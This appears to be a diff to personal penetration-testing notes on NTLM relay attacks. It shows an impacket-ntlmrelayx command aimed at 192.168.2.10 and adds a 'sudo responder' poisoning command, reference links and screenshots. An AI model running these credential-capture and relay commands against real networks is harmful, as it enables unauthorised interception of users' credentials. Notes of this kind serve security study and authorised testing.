@@ -21,3 +21,14 @@ impacket-ntlmrelayx -t 192.168.2.10  -smb2support -debug
 ```
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/a984c248-c211-4e67-8ca4-c3d99cd73c36)
+
+https://pentestlab.blog/tag/smb-relay/
+
+https://xakep.ru/2023/04/07/ntlm-relay-guide/#toc04.2
+
+```
+sudo responder -wd -I eth0
+```
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/7cdbe0d6-b20f-477e-abd0-acd2923370f5)
+
+
